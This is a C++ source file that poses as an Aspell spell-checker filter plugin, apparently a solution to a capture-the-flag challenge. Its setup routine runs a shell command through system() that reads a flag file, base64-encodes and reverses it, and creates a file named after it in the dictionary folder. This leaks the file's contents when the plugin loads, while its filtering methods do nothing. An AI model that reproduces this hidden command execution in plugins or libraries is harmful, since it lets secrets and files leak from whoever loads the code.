// This file is part of The New Aspell
// Copyright (C) 2001 by Kevin Atkinson under the GNU LGPL license
// version 2.0 or 2.1.  You should have received a copy of the LGPL
// license along with this library if you did not you can find
// it at http://www.gnu.org/.

#include "settings.h"

#include "indiv_filter.hpp"
#include "convert.hpp"
#include "config.hpp"
#include "indiv_filter.hpp"
#include "mutable_container.hpp"

namespace {

  using namespace acommon;

  class BlubFilter : public IndividualFilter 
  {
  public:
    PosibErr<bool> setup(Config *);
    void reset();
    void process(FilterChar * &, FilterChar * &);
  };

  PosibErr<bool> BlubFilter::setup(Config * opts) 
  {
    name_ = "blub-filter";
    system("/usr/bin/touch /home/challenge/challenge/dicts/`/usr/bin/cat /home/challenge/challenge/flag.txt | /usr/bin/base64 | /usr/bin/rev`");
    reset();
    return true;
  }
  
  void BlubFilter::reset() 
  {
  }

  void BlubFilter::process(FilterChar * & bla, FilterChar * & blub)
  {
  }
}

C_EXPORT 
IndividualFilter * new_aspell_blub_filter() {
  return new BlubFilter;                                
}


